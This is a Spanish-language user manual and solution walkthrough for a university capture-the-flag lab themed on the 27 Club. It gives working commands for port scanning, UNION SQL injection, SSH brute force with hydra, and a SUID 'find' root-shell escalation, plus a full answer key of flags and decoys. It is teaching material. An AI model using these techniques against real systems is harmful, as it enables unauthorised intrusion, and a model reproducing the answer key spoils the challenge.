# 🎸 The 27 Club CTF — Manual de Usuario y Guía Oficial de Resolución (Walkthrough)
**Universidad de Cundinamarca • Facultad de Ingeniería**  
**Línea de Profundización I: Seguridad de Aplicaciones y Hacking Ético**  
**Autor / Auditor:** Óscar Robayo (`@rockbayo`)  
**Estándar de Banderas:** `27C{...}` • **Puntaje Total:** `1.000 PTS` • **Calificación:** `5.0 / 5.0`

---

## 📋 1. Arquitectura de Red y Despliegue

### Requisitos de Laboratorio:
1. **Máquina Víctima (Docker Host):** IP `192.168.56.1` (o red asignada por VirtualBox Host-Only / Puente).
2. **Máquina Atacante:** Kali Linux (en el mismo segmento de red, e.g. `192.168.56.10`).
3. **Servicios Expuestos en el Objetivo:**
   * Puerto `80/TCP`: Servidor Web Apache (Módulos de reto y DVWA base).
   * Puerto `1337/TCP`: Servicio Señuelo Troll (Rabbit Hole).
   * Puerto `2222/TCP`: Servicio OpenSSH (Consola interactiva de Kurt Cobain).

### Comando de Arranque del Laboratorio (En Host Víctima):
```bash
docker compose up -d --build
```

---

## 🚪 2. Desbloqueo del Tablero Interactivo (Lockdown Gate)
1. Abrir `index.html` (o `tablero3d_27club.html`) en el navegador.
2. El cronómetro regresivo de **60:00 minutos** iniciará automáticamente.
3. Para desbloquear el acceso al tablero, el estudiante debe ingresar la dirección IP exacta de la máquina víctima identificada:
   ```text
   192.168.56.1
   ```
4. Al hacer clic en **"CONECTAR AL OBJETIVO (DESBLOQUEAR)"**, la compuerta se abre con un acorde de guitarra y se habilitan los 27 trastes del diapasón.

---

## 🎯 3. Guía Paso a Paso de Resolución (Desde Kali Linux)

---

### 🔹 Fase 0: Robert Johnson (Padrino del Club) — Traste 3 (+100 PTS)
* **Objetivo:** Detección de servicios y enumeración de cabeceras HTTP.
* **Estándar:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
* **Música Asignada:** *Cross Road Blues* (1936) — Robert Johnson.

#### Ejecución en Kali Linux:
```bash
# 1. Escaneo inicial de reconocimiento
nmap -sV -p 80,1337,2222 192.168.56.1

# 2. Enumeración detallada de cabeceras HTTP de respuesta
curl -I http://192.168.56.1/
```

#### Salida Forense Observada:
```http
HTTP/1.1 200 OK
Date: Wed, 11 Nov 2026 05:00:00 GMT
Server: Apache/2.4.25 (Debian)
X-Rock-Memorial: The 27 Club CTF - Live Fast, Die Young, Leave a Clean Codebase
X-Artist-Tribute: Robert Johnson, Jimi Hendrix, Janis Joplin, Jim Morrison, Amy Winehouse, Kurt Cobain
X-Security-Auditor: Oscar Robayo - Universidad de Cundinamarca
X-Discovery-Token: 27C{nmap_sc4n_r0ck_h0st_d1sc0v3ry}
```

* **Bandera Oficial:** `27C{nmap_sc4n_r0ck_h0st_d1sc0v3ry}`
* **Acción en el Tablero:** Inyectar en la terminal de Kali del tablero. El slide se mueve al **Traste 3**, suma **+100 PTS**, suena *Cross Road Blues* y se desbloquea el vinilo de Robert Johnson.

---

### ⚠️ SEÑUELO TROLL: Puerto 1337 Backdoor Trap (-50 PTS)
* **Objetivo Pedagógico:** Discriminación de señuelos (inspirado en la máquina Troll del Laboratorio 2).

#### Ejecución en Kali Linux:
```bash
# Conexión al puerto no convencional detectado por Nmap
nc -nv 192.168.56.1 1337
```

#### Salida Observada:
```text
(UNKNOWN) [192.168.56.1] 1337 (elite) open
====================================================
[!] THE 27 CLUB - MASTER BACKDOOR SERVICE
[+] Acceso no autorizado detectado. Clave de bypass:
27C{tr0ll_b4ckd00r_p0rt_1337_lol}
====================================================
```

* **Señuelo Capturado:** `27C{tr0ll_b4ckd00r_p0rt_1337_lol}`
* **Efecto en el Tablero:** Si el estudiante lo ingresa, se activa la alerta de **RABBIT HOLE**, se descuentan **-50 PTS** y se reproduce el video de retroalimentación de distracción.

---

### 🔹 Fase 1: Jimi Hendrix — Traste 6 (+150 PTS)
* **Objetivo:** Análisis forense de tráfico de red y descifrado de baliza C&C.
* **Estándar:** CWE-311 (Missing Encryption of Sensitive Data / ROT13).
* **Música Asignada:** *Purple Haze* — Jimi Hendrix.

#### Ejecución en Kali Linux:
```bash
# 1. Descarga o captura de tráfico HTTP
curl -O http://192.168.56.1/jimi_hendrix.pcap

# 2. Inspección profunda de paquetes con tshark / grep
tshark -r jimi_hendrix.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u
```

#### Cadena Ofuscada Detectada:
```text
27P{checy3_u4m3_p0aq0e_a3g}
```

#### Descifrado Criptográfico (ROT13):
```bash
echo "27P{checy3_u4m3_p0aq0e_a3g}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

* **Bandera Oficial:** `27C{purpl3_h4z3_c0nd0r_n3t}`
* **Acción en el Tablero:** Inyectar en el tablero. El slide se desliza al **Traste 6**, suma **+150 PTS** y suena *Purple Haze*.

---

### 🔹 Fase 2: Janis Joplin — Traste 11 (+150 PTS)
* **Objetivo:** Reconocimiento de rutas ocultas y extracción de esteganografía EOF.
* **Estándar:** CWE-200 (Information Exposure).
* **Música Asignada:** *Cry Baby* — Janis Joplin.

#### Ejecución en Kali Linux:
```bash
# 1. Lectura del archivo de indexación
curl -s http://192.168.56.1/robots.txt
```
*Se observan dos rutas:* `/cry_baby/` y `/admin_trampa/`.

```bash
# 2. Descarga del recurso multimedia legítimo
curl -s http://192.168.56.1/cry_baby/janis.jpg -o janis.jpg

# 3. Análisis de cadenas al final del binario (EOF)
strings janis.jpg | tail -n 5
```

* **Bandera Oficial:** `27C{p34rl_cry_b4by_s3cr3t_1970}`
* **Trampa Señuelo en `/admin_trampa/`:** Descargar `backup_keys.jpg` revela `27C{b4ckup_k3ys_v4ult_c4r4v4n}` (-50 PTS).
* **Acción en el Tablero:** Inyectar la bandera legítima. El slide avanza al **Traste 11**, suma **+150 PTS** y suena *Cry Baby*.

---

### 🔹 Fase 3: Jim Morrison — Traste 16 (+200 PTS)
* **Objetivo:** Inyección SQL basada en operadores UNION y enumeración de esquemas.
* **Estándar:** CWE-89 (SQL Injection).
* **Música Asignada:** *Light My Fire* — The Doors.

#### Ejecución en Kali Linux:
```bash
# 1. Verificación del punto de inyección en /doors/
curl -s "http://192.168.56.1/doors/?id=1'"

# 2. Enumeración de columnas (3 columnas coincidentes)
curl -s "http://192.168.56.1/doors/?id=-1 UNION SELECT 1,2,3-- -"

# 3. Exfiltración del secreto oficial en la tabla doors_vault
curl -s "http://192.168.56.1/doors/?id=-1 UNION SELECT cancion, album, secreto FROM doors_vault WHERE id=2-- -"
```

* **Bandera Oficial:** `27C{l1ght_my_f1r3_c1p4_sqli}`
* **Trampa Señuelo en tabla `doors_trap`:** Inyectar en `doors_trap` exfiltra `27C{th3_3nd_d00rs_m4st3r_v4ult}` (-50 PTS).
* **Acción en el Tablero:** Inyectar la bandera oficial. El slide avanza al **Traste 16**, suma **+200 PTS** y suena *Light My Fire*.

---

### 🔹 Fase 4: Amy Winehouse — Traste 21 (+200 PTS)
* **Objetivo:** Stored Cross-Site Scripting (XSS) y secuestro de sesión administrativa.
* **Estándar:** CWE-79 (Improper Neutralization of Input During Web Page Generation).
* **Música Asignada:** *Back To Black* — Amy Winehouse.

#### Ejecución en Kali Linux:
```bash
# 1. Auditoría del libro de visitas y cabeceras de cookies
curl -i http://192.168.56.1/winehouse/

# 2. Observación de tokens de sesión emitidos
# Set-Cookie: admintoken=27C{b4ck_t0_bl4ck_4dm1n_t0k3n}; path=/
# Set-Cookie: test_decoy=27C{t3st_s3ss10n_d3c0y_c4md3n}; path=/
```

* **Bandera Oficial:** `27C{b4ck_t0_bl4ck_4dm1n_t0k3n}`
* **Trampa Señuelo de Cookie:** `test_decoy` contiene `27C{t3st_s3ss10n_d3c0y_c4md3n}` (-50 PTS).
* **Acción en el Tablero:** Inyectar la bandera legítima. El slide avanza al **Traste 21**, suma **+200 PTS** y suena *Back To Black*.

---

### 🔹 Fase 5: Kurt Cobain (ROOT) — Traste 27 (+200 PTS)
* **Objetivo:** Fuerza bruta / diccionario de credenciales SSH y escalada local de privilegios SUID.
* **Estándar:** CWE-307 (Improper Restriction of Excessive Authentication Attempts) & CWE-250 (Execution with Unnecessary Privileges).
* **Música Asignada:** *Smells Like Teen Spirit* — Nirvana.

#### Ejecución en Kali Linux:
```bash
# 1. Auditoría de contraseñas por diccionario contra SSH (Puerto 2222)
hydra -l kurt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.1 -s 2222
# Credencial válida encontrada: kurt / nirvana

# 2. Conexión interactiva SSH
ssh kurt@192.168.56.1 -p 2222
# Password: nirvana

# 3. Auditoría de binarios SUID en el sistema de archivos
find / -perm -u=s -type f 2>/dev/null
# Binario anómalo identificado: /usr/bin/find

# 4. Explotación SUID (Técnica GTFOBins) y lectura del artefacto final
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami
# root (euid=0)

# 5. Captura de la bandera Root suprema
cat /root/flag.txt
```

#### Salida de la Bandera Root:
```text
========================================================================
   ⚡ THE 27 CLUB CTF - UNIVERSIDAD DE CUNDINAMARCA ⚡
   COMPROMISO TOTAL DEL SISTEMA (ROOT UID 0 ALCANZADO)
========================================================================
BANDERA FINAL: 27C{sm3lls_l1k3_grung3_r00t_27}
Felicidades Auditor. Has superado las 6 fases y conquistado el reto.
```

* **Bandera Oficial:** `27C{sm3lls_l1k3_grung3_r00t_27}`
* **Acción en el Tablero:** Inyectar la bandera Root. El slide alcanza el **Traste 27**, suma **+200 PTS** y se dispara la **Gran Ceremonia de Victoria Final**:
  * Acorde mayor distorsionado con ovación de concierto.
  * Lluvia de confeti dorado en pantalla completa.
  * Certificado oficial con **Puntaje Final: 1.000 / 1.000 PTS** y **Calificación: 5.0 / 5.0 (RANGO ROOT GOD)**.
  * Botón para imprimir o guardar constancia académica.

---

## 📊 4. Matriz Resumen de Banderas y Respuestas

| Fase | Traste | Artista | Bandera Oficial | Puntos |
| :---: | :---: | :--- | :--- | :---: |
| **F0** | **3** | Robert Johnson | `27C{nmap_sc4n_r0ck_h0st_d1sc0v3ry}` | +100 PTS |
| **F1** | **6** | Jimi Hendrix | `27C{purpl3_h4z3_c0nd0r_n3t}` | +150 PTS |
| **F2** | **11** | Janis Joplin | `27C{p34rl_cry_b4by_s3cr3t_1970}` | +150 PTS |
| **F3** | **16** | Jim Morrison | `27C{l1ght_my_f1r3_c1p4_sqli}` | +200 PTS |
| **F4** | **21** | Amy Winehouse | `27C{b4ck_t0_bl4ck_4dm1n_t0k3n}` | +200 PTS |
| **F5** | **27** | Kurt Cobain (ROOT) | `27C{sm3lls_l1k3_grung3_r00t_27}` | +200 PTS |
| **TOTAL** | — | — | **6 BANDERAS CAPTURADAS** | **1.000 PTS (5.0)** |

### Trampas y Señuelos (Rabbit Holes):
* Señuelo Troll Port 1337: `27C{tr0ll_b4ckd00r_p0rt_1337_lol}` (-50 PTS)
* Señuelo Janis Joplin (`/admin_trampa/backup_keys.jpg`): `27C{b4ckup_k3ys_v4ult_c4r4v4n}` (-50 PTS)
* Señuelo Jim Morrison (Tabla `doors_trap`): `27C{th3_3nd_d00rs_m4st3r_v4ult}` (-50 PTS)
* Señuelo Amy Winehouse (Cookie `test_decoy`): `27C{t3st_s3ss10n_d3c0y_c4md3n}` (-50 PTS)
